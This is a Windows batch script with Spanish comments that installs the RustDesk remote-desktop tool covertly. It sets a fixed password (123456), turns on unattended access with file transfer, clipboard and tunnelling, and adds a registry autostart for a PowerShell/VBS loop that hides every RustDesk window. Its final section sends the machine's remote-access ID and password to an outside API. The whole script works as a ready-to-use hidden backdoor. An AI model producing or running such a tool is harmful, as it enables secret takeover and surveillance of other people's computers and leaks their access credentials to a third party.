@echo off
title Instalador RustDesk Invisible
color 0A

echo ===================================
echo  INSTALADOR RUSTDESK INVISIBLE
echo  (Sin software externo)
echo ===================================
echo.

REM Verifica si RustDesk ya está instalado
if exist "C:\Program Files\RustDesk\rustdesk.exe" (
    echo RustDesk ya esta instalado!
    echo.
    choice /C SN /M "Deseas reconfigurarlo (S) o solo obtener el ID (N)"
    
    if errorlevel 2 goto iniciar_ocultador_solo
    if errorlevel 1 goto reconfigurar
) else (
    goto instalar
)

:instalar
echo [1/8] Descargando RustDesk...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.exe' -OutFile '%TEMP%\rustdesk.exe'"

if not exist "%TEMP%\rustdesk.exe" (
    echo ERROR: No se pudo descargar RustDesk
    pause
    exit
)

echo [2/8] Instalando silenciosamente...
start /wait "" "%TEMP%\rustdesk.exe" --silent-install
timeout /t 10 /nobreak
taskkill /F /IM rustdesk.exe >nul 2>&1
timeout /t 2 /nobreak

REM ========== CREAR OCULTADOR ANTES DE CONFIGURAR ==========
:iniciar_ocultador
echo [3/8] Creando script ocultador nativo...
mkdir "C:\RustDesk-Hidden" 2>nul

REM Script PowerShell que oculta ventanas usando ShowWindow (SW_HIDE = 0)
(
echo Add-Type @"
echo using System;
echo using System.Runtime.InteropServices;
echo using System.Text;
echo public class Win32 {
echo     [DllImport("user32.dll"^)]
echo     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow^);
echo     [DllImport("user32.dll"^)]
echo     public static extern bool IsWindowVisible(IntPtr hWnd^);
echo     [DllImport("user32.dll"^)]
echo     public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count^);
echo     public const int SW_HIDE = 0;
echo     public const int SW_SHOW = 5;
echo }
echo "@
echo.
echo function Get-WindowTitle($hwnd^) {
echo     $title = New-Object System.Text.StringBuilder 256
echo     [Win32]::GetWindowText($hwnd, $title, $title.Capacity^) ^| Out-Null
echo     return $title.ToString(^)
echo }
echo.
echo function Hide-AllRustDeskWindows {
echo     Get-Process ^| Where-Object { $_.ProcessName -eq "rustdesk" } ^| ForEach-Object {
echo         try {
echo             $hwnd = $_.MainWindowHandle
echo             if ($hwnd -ne [IntPtr]::Zero -and [Win32]::IsWindowVisible($hwnd^)^) {
echo                 $title = Get-WindowTitle $hwnd
echo                 if ($title -ne ""^) {
echo                     [Win32]::ShowWindow($hwnd, [Win32]::SW_HIDE^) ^| Out-Null
echo                 }
echo             }
echo         } catch { }
echo     }
echo }
echo.
echo while ($true^) {
echo     try { Hide-AllRustDeskWindows } catch { }
echo     Start-Sleep -Milliseconds 500
echo }
) > "C:\RustDesk-Hidden\hide-rustdesk.ps1"

echo [4/8] Creando lanzador invisible...
echo Set objShell = CreateObject("WScript.Shell") > "C:\RustDesk-Hidden\launch-hider.vbs"
echo objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\RustDesk-Hidden\hide-rustdesk.ps1""", 0, False >> "C:\RustDesk-Hidden\launch-hider.vbs"

echo Iniciando ocultador...
start /B wscript.exe "C:\RustDesk-Hidden\launch-hider.vbs"
timeout /t 2 /nobreak

goto configurar

:reconfigurar
echo.
echo Reconfigurando RustDesk existente...
taskkill /F /IM rustdesk.exe >nul 2>&1
net stop rustdesk >nul 2>&1
timeout /t 2 /nobreak
goto iniciar_ocultador

:iniciar_ocultador_solo
echo [1/4] Preparando ocultador...
mkdir "C:\RustDesk-Hidden" 2>nul

(
echo Add-Type @"
echo using System;
echo using System.Runtime.InteropServices;
echo using System.Text;
echo public class Win32 {
echo     [DllImport("user32.dll"^)]
echo     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow^);
echo     [DllImport("user32.dll"^)]
echo     public static extern bool IsWindowVisible(IntPtr hWnd^);
echo     [DllImport("user32.dll"^)]
echo     public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count^);
echo     public const int SW_HIDE = 0;
echo }
echo "@
echo.
echo function Get-WindowTitle($hwnd^) {
echo     $title = New-Object System.Text.StringBuilder 256
echo     [Win32]::GetWindowText($hwnd, $title, $title.Capacity^) ^| Out-Null
echo     return $title.ToString(^)
echo }
echo.
echo function Hide-AllRustDeskWindows {
echo     Get-Process ^| Where-Object { $_.ProcessName -eq "rustdesk" } ^| ForEach-Object {
echo         try {
echo             $hwnd = $_.MainWindowHandle
echo             if ($hwnd -ne [IntPtr]::Zero -and [Win32]::IsWindowVisible($hwnd^)^) {
echo                 $title = Get-WindowTitle $hwnd
echo                 if ($title -ne ""^) {
echo                     [Win32]::ShowWindow($hwnd, [Win32]::SW_HIDE^) ^| Out-Null
echo                 }
echo             }
echo         } catch { }
echo     }
echo }
echo.
echo while ($true^) {
echo     try { Hide-AllRustDeskWindows } catch { }
echo     Start-Sleep -Milliseconds 500
echo }
) > "C:\RustDesk-Hidden\hide-rustdesk.ps1"

echo Set objShell = CreateObject("WScript.Shell") > "C:\RustDesk-Hidden\launch-hider.vbs"
echo objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\RustDesk-Hidden\hide-rustdesk.ps1""", 0, False >> "C:\RustDesk-Hidden\launch-hider.vbs"

echo [2/4] Configurando inicio automatico...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "RustDeskHider" /t REG_SZ /d "wscript.exe \"C:\RustDesk-Hidden\launch-hider.vbs\"" /f >nul 2>&1

echo [3/4] Iniciando ocultador...
start /B wscript.exe "C:\RustDesk-Hidden\launch-hider.vbs"
timeout /t 2 /nobreak

echo [4/4] Obteniendo ID...
goto obtener_id

:configurar
echo [5/8] Configurando contrasena permanente...
"C:\Program Files\RustDesk\rustdesk.exe" --password 123456
timeout /t 3 /nobreak
taskkill /F /IM rustdesk.exe >nul 2>&1

echo [6/8] Habilitando acceso sin supervision...
"C:\Program Files\RustDesk\rustdesk.exe" --option enable-direct-ip-access Y
timeout /t 2 /nobreak
taskkill /F /IM rustdesk.exe >nul 2>&1

echo [7/8] Configurando permisos permanentes...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-enable-direct-ip-access" /t REG_SZ /d "Y" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-enable-keyboard" /t REG_SZ /d "Y" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-enable-clipboard" /t REG_SZ /d "Y" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-enable-file-transfer" /t REG_SZ /d "Y" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-enable-audio" /t REG_SZ /d "Y" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-enable-tunnel" /t REG_SZ /d "Y" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-direct-server" /t REG_SZ /d "Y" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\RustDesk\config" /v "option-allow-always" /t REG_SZ /d "Y" /f >nul 2>&1

echo [8/8] Configurando inicio automatico...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "RustDeskHider" /t REG_SZ /d "wscript.exe \"C:\RustDesk-Hidden\launch-hider.vbs\"" /f >nul 2>&1

goto obtener_id

:obtener_id
echo Instalando servicio...
"C:\Program Files\RustDesk\rustdesk.exe" --install-service
timeout /t 3 /nobreak
net start rustdesk >nul 2>&1
timeout /t 5 /nobreak

echo Obteniendo ID...
for /f "delims=" %%i in ('"C:\Program Files\RustDesk\rustdesk.exe" --get-id 2^>nul') do set RUSTDESK_ID=%%i

if "%RUSTDESK_ID%"=="" (
    echo Esperando generacion de ID...
    timeout /t 5 /nobreak
    for /f "delims=" %%i in ('"C:\Program Files\RustDesk\rustdesk.exe" --get-id 2^>nul') do set RUSTDESK_ID=%%i
)

echo %RUSTDESK_ID% > "%USERPROFILE%\Desktop\RustDesk_ID.txt"

taskkill /F /IM rustdesk.exe >nul 2>&1
timeout /t 2 /nobreak

sc query rustdesk | find "RUNNING" >nul
if %errorlevel%==0 (
    echo Servicio RustDesk: ACTIVO
) else (
    net start rustdesk
)

echo.
echo ===================================
echo TU ID DE RUSTDESK ES:
echo %RUSTDESK_ID%
echo TU CONTRASENA ES: 
echo 123456
echo ===================================
echo.
echo ID guardado en: %USERPROFILE%\Desktop\RustDesk_ID.txt
echo.

REM ========== ENVIAR A LA API ==========
echo Enviando datos a la API...
set API_URL=https://esfm.vercel.app/api/codes
set PASSWORD=123456
set MAX_INTENTOS=5
set INTENTO=1

:enviar_api
echo Intento %INTENTO% de %MAX_INTENTOS%...

REM Enviar POST y capturar respuesta
for /f "delims=" %%r in ('powershell -Command "$body = @{code='%RUSTDESK_ID%'; password='%PASSWORD%'} | ConvertTo-Json; try { $response = Invoke-RestMethod -Uri '%API_URL%' -Method Post -Body $body -ContentType 'application/json'; if ($response.code -eq '%RUSTDESK_ID%' -and $response.password -eq '%PASSWORD%') { Write-Output 'OK' } else { Write-Output 'MISMATCH' } } catch { Write-Output 'ERROR' }"') do set API_RESULT=%%r

if "%API_RESULT%"=="OK" (
    echo ✓ Datos enviados y verificados correctamente!
    goto api_exito
)

if "%API_RESULT%"=="MISMATCH" (
    echo ! Respuesta no coincide, reintentando...
)

if "%API_RESULT%"=="ERROR" (
    echo ! Error de conexion, reintentando...
)

set /a INTENTO+=1
if %INTENTO% LEQ %MAX_INTENTOS% (
    timeout /t 2 /nobreak >nul
    goto enviar_api
)

echo.
echo ✗ No se pudo verificar el envio despues de %MAX_INTENTOS% intentos
echo   Verificando manualmente si existe en la BD...

REM Verificar si ya existe en la BD
for /f "delims=" %%v in ('powershell -Command "try { $codes = Invoke-RestMethod -Uri '%API_URL%' -Method Get; $found = $codes | Where-Object { $_.code -eq '%RUSTDESK_ID%' }; if ($found) { Write-Output 'ENCONTRADO' } else { Write-Output 'NO_ENCONTRADO' } } catch { Write-Output 'ERROR_VERIFICACION' }"') do set VERIFY_RESULT=%%v

if "%VERIFY_RESULT%"=="ENCONTRADO" (
    echo ✓ El codigo YA existe en la base de datos!
    goto api_exito
)

echo ✗ El codigo NO se pudo guardar en la base de datos
echo   Puedes intentar manualmente despues
goto api_fin

:api_exito
echo.
echo ===================================
echo  DATOS GUARDADOS EN LA NUBE
echo ===================================
echo Codigo: %RUSTDESK_ID%
echo Password: %PASSWORD%
echo API: %API_URL%
echo ===================================

:api_fin
echo.
echo OCULTADOR NATIVO ACTIVO!
echo - Usa Windows API directamente
echo - No requiere software externo
echo - Ventanas ocultas en 0.5 segundos
echo - 100%% invisible
echo.
pause
